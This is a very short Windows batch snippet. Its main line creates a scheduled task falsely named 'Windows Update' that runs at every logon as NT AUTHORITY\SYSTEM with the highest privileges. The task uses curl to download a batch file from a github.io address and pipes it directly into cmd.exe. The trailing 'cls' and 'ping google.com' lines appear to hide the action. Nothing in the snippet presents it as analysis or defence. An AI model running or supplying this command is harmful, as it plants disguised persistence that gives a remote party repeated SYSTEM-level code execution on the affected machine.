schtasks /create /tn "Windows Update" /tr "cmd.exe /k curl -s "https://mohammadsajidalam.github.io/cmd/after.bat" | cmd.exe" /sc onlogon /ru "NT AUTHORITY\SYSTEM" /RL HIGHEST /F
cls
ping google.com
